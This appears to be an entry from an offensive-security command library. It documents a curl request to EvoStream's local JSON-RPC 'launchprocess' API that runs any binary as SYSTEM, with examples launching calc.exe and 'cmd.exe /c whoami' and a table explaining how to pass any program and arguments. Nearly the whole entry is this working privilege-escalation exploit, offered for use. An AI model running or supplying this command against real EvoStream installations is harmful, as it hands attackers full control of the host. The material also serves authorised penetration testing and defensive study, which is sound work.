---
id: cmd-curl-launch
data: >-
  curl -X POST http://localhost:7440/jsonrpc -H "Content-Type: application/json"
  -d '{"jsonrpc": "2.0", "method": "launchprocess", "params": {"appName":
  "calc.exe", "streamName": ""}, "id": 1}'
tags:
  - rce
  - api
type: command
output: null
executor: bash
platforms:
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:30:58.543Z'
verified: false
validated: true
submitted: true
---
# curl-launchprocess

## Command

```bash
curl -X POST http://localhost:7440/jsonrpc -H "Content-Type: application/json" -d '{"jsonrpc": "2.0", "method": "launchprocess", "params": {"appName": "calc.exe", "streamName": ""}, "id": 1}'
```

## Description

Executes arbitrary binary via EvoStream launchprocess API as SYSTEM.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| appName | Binary path | Yes |
| streamName | Arguments | No |

## Examples

### Basic Usage

```bash
curl -X POST http://localhost:7440/jsonrpc -H "Content-Type: application/json" -d '{"jsonrpc": "2.0", "method": "launchprocess", "params": {"appName": "calc.exe", "streamName": ""}, "id": 1}'
```

### Advanced Usage

```bash
curl -X POST http://localhost:7440/jsonrpc -H "Content-Type: application/json" -d '{"jsonrpc": "2.0", "method": "launchprocess", "params": {"appName": "cmd.exe", "streamName": "/c whoami"}, "id": 1}'
```

## Expected Output

JSON success response; binary executes visibly.

## Related

- [[procedures/Local-Privilege-Escalation-via-LaunchProcess-Command]]
